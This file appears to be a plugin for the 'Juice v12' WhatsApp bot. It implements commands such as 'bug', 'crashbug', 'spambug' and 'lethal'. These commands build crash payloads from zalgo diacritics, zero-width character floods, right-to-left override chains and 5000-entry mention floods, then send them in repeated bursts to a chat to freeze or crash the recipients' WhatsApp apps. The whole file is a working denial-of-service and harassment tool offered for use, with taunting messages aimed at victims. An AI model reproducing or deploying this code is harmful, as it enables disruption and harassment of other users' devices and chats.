
  //═════════════════════════════════//

  /*
  🔗 Juice v12 Bot System
  by Ariah • 2024 - 2026

  >> Contact Links:
  ・WhatsApp : wa.me/254753204154

  ⚠️ BUG COMMANDS - Use responsibly
  */

  //═════════════════════════════════//
  require('../setting')

  // ── Bug generators ────────────────────────────────────────────────────────────

  // Zalgo — piles hundreds of combining diacritics onto every char → crashes renderer
  function zalgo(text = '​', intensity = 300) {
      const above = '̙̍̎̄̅̒̓̔̈̂̐͂̓̈́̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̚̕̚ͅ͏͠͡'
      const below = '̖̗̘̙̜̝̞̟̠̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼ͅ'
      const mid   = 'ͣͤͥͦͧͨͩͪͫͬͭͮͯ̕̚͟͢͡͠͞ͰͲ'
      const all   = above + below + mid
      return text.split('').map(c => {
          let s = c
          for (let i = 0; i < intensity; i++) s += all[Math.floor(Math.random() * all.length)]
          return s
      }).join('')
  }

  // Zero-width flood — invisible characters that bloat message processing
  function zwFlood(n = 8000) {
      const chars = ['\u200b','\u200c','\u200d','\u200e','\u200f','\u202a','\u202b',
                     '\u202c','\u202d','\u202e','\u2060','\u2061','\u2062','\u2063',
                     '\uFEFF','\u00AD','\u034f','\u17b4','\u17b5','\u2028','\u2029']
      return Array.from({length: n}, () => chars[Math.floor(Math.random() * chars.length)]).join('')
  }

  // Arabic RTL collapse — mixes RTL override + Arabic unicode to shatter layout
  function arabicBug(repeat = 60) {
      const rtl  = '\u202e'  // RIGHT-TO-LEFT OVERRIDE
      const ltr  = '\u202d'  // LEFT-TO-RIGHT OVERRIDE
      const base = '\u0623\u0646\u062a \u062a\u0647\u0643\u0631 \u0648\u0627\u0636\u062d \u0647\u0647\u0647'
      const rtlMark = '\u200f'
      let s = ''
      for (let i = 0; i < repeat; i++) {
          s += rtl + base + ltr + rtlMark + '\n'
      }
      return s
  }

  // Mention flood — array of fake JIDs WhatsApp tries to resolve (kills render thread)
  function mentionFlood(count = 5000) {
      const jids = []
      for (let i = 0; i < count; i++) {
          jids.push(`254${String(700000000 + i).padStart(9,'0')}@s.whatsapp.net`)
      }
      return jids
  }

  // Hard crash text — combines zalgo + zero-width + RTL + BOM in one message
  function hardCrash(reps = 5) {
      const bom   = '\uFEFF'
      const rtlO  = '\u202e'
      const ltrO  = '\u202d'
      const zwj   = '\u200d'
      const core  = zalgo('J̷̣̲̱̫̒U̶I̶C̷Ḛ̷̫͎̒͘ ̷̢̖͇̱̔̓v̷̛͚͖͘͘1̴̧̙̩̦̅2̵̗̅̊', 150)
      let out = ''
      for (let i = 0; i < reps; i++) {
          out += bom + rtlO + zwFlood(1500) + core + ltrO + zwFlood(1500) + '\n'
      }
      return out
  }

  // Crash sentence — sends a visually dense, processor-heavy sentence
  function crashSentence() {
      const glitchAlpha = 'A̷B̸C̶D̵E̴F̳G̲H̳I̴J̵K̶L̷M̸N̶O̷P̸Q̵R̶S̴T̳U̲V̱W̲X̳Y̴Z̵'
      const line = '⚡️' + zalgo('JUICE v12 BUG ACTIVATED', 200) + zwFlood(3000) + '⚡️'
      return line
  }

  // Header banner
  const HDR = (title) =>
  `╔══════════════════════════╗
  ║   ⚡ *Juice v12 — Bug Mode*
  ║   _Activated by Ariah_
  ╚══════════════════════════╝

    🔴 *${title}*

  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
  _⚡ Juice v12 • wa.me/254753204154_`

  // Get target JID from mention or quoted message
  function getTarget(context) {
      const { m, args, X } = context
      // Priority: @mention in args → quoted sender → null
      const mentioned = m.mentionedJid && m.mentionedJid[0]
      if (mentioned) return mentioned
      if (m.quoted && m.quoted.sender) return m.quoted.sender
      return null
  }

  // ── Commands ──────────────────────────────────────────────────────────────────

  module.exports = {
      type: 'bug',
      command: [
          'bug', 'bug1', 'freezebug', 'arabicbug',
          'bug2', 'bug3', 'crashbug', 'zalgobug',
          'mentionbug', 'invisiblebug', 'maxbug', 'spambug',
          'bug4', 'bug5', 'hardbug', 'lethal'
      ],
      operate: async (context) => {
          const { command, X, m, reply, q } = context
          const from = m.chat
          const target = getTarget(context) || from

          // ── .bug / .bug1 — Standard zalgo crash bug ─────────────────────────
          if (['bug', 'bug1'].includes(command)) {
              await reply(HDR('Standard Crash Bug Sent!'))
              const msg1 = zalgo('JUICE v12', 250) + zwFlood(4000) + zalgo(' BUG ', 200)
              await X.sendMessage(from, { text: msg1 })
              const msg2 = zwFlood(5000) + zalgo('YOU HAVE BEEN BUGGED BY JUICE v12', 150)
              await X.sendMessage(from, { text: msg2 })
          }

          // ── .bug2 / .arabicbug — Arabic RTL renderer crash ──────────────────
          else if (['bug2', 'arabicbug'].includes(command)) {
              await reply(HDR('Arabic RTL Crash Bug Sent!'))
              const arabicMsg = arabicBug(80) + zwFlood(3000)
              await X.sendMessage(from, { text: arabicMsg })
          }

          // ── .bug3 / .invisiblebug — Invisible character flood ───────────────
          else if (['bug3', 'invisiblebug'].includes(command)) {
              await reply(HDR('Invisible Flood Bug Sent!'))
              // Send 3 back-to-back invisible floods
              for (let i = 0; i < 3; i++) {
                  await X.sendMessage(from, { text: zwFlood(8000) + '\u200b' })
              }
          }

          // ── .bug4 / .zalgobug — Heavy zalgo crash ───────────────────────────
          else if (['bug4', 'zalgobug'].includes(command)) {
              await reply(HDR('Zalgo Overflow Bug Sent!'))
              const zMsg = zalgo('Juice v12 Bug Activated — Your WhatsApp Is Now Lagging. Hacked By Ariah', 300)
              await X.sendMessage(from, { text: zMsg })
              await X.sendMessage(from, { text: zalgo('💀 You got bugged 💀', 400) })
          }

          // ── .bug5 / .freezebug — Freeze combo bug ───────────────────────────
          else if (['bug5', 'freezebug'].includes(command)) {
              await reply(HDR('Freeze Bug Sent! Target chat is freezing...'))
              const freeze = zwFlood(6000) + arabicBug(40) + zwFlood(4000)
              for (let i = 0; i < 4; i++) {
                  await X.sendMessage(from, { text: freeze + zalgo('🥶', 100) })
                  await new Promise(r => setTimeout(r, 800))
              }
          }

          // ── .crashbug / .hardbug — High-power crash combination ─────────────
          else if (['crashbug', 'hardbug'].includes(command)) {
              await reply(HDR('Hard Crash Bug Sent! 🔥'))
              const crash1 = hardCrash(4)
              await X.sendMessage(from, { text: crash1 })
              await new Promise(r => setTimeout(r, 600))
              await X.sendMessage(from, { text: hardCrash(3) })
          }

          // ── .mentionbug — Mention flood (5000 fake JIDs) ────────────────────
          else if (['mentionbug'].includes(command)) {
              await reply(HDR('Mention Flood Bug Sent! 📛'))
              const jids   = mentionFlood(5000)
              const bugTxt = '📛 ' + zalgo('MENTION BUG — Juice v12', 100) + '\n' + zwFlood(2000)
              await X.sendMessage(from, { text: bugTxt, mentions: jids })
          }

          // ── .spambug — Rapid-fire spam of bug messages ───────────────────────
          else if (['spambug'].includes(command)) {
              await reply(HDR('Spam Bug Activated! Sending 10 crash messages...'))
              for (let i = 1; i <= 10; i++) {
                  const lvl = i % 3 === 0 ? zalgo(`Bug #${i} 💀`, 200 + i * 10) :
                              i % 3 === 1 ? zwFlood(4000 + i * 200) :
                                            arabicBug(20 + i * 3)
                  await X.sendMessage(from, { text: lvl })
                  await new Promise(r => setTimeout(r, 500))
              }
          }

          // ── .maxbug / .lethal — Maximum power all-in bug ────────────────────
          else if (['maxbug', 'lethal'].includes(command)) {
              await reply(HDR('☠️ MAX BUG — Maximum Power Activated!'))
              // Phase 1: Hard crash text
              await X.sendMessage(from, { text: hardCrash(6) })
              await new Promise(r => setTimeout(r, 700))
              // Phase 2: Invisible flood
              for (let i = 0; i < 5; i++) {
                  await X.sendMessage(from, { text: zwFlood(8000) })
                  await new Promise(r => setTimeout(r, 400))
              }
              // Phase 3: Arabic RTL storm
              await X.sendMessage(from, { text: arabicBug(100) + zwFlood(5000) })
              await new Promise(r => setTimeout(r, 500))
              // Phase 4: Zalgo climax
              await X.sendMessage(from, { text: zalgo('☠️ JUICE v12 MAX BUG — ACTIVATED BY ARIAH ☠️', 500) })
              // Phase 5: Mention flood
              const jids = mentionFlood(5000)
              await X.sendMessage(from, { text: zalgo('💀 GG 💀', 300) + zwFlood(3000), mentions: jids })
          }
      }
  }
  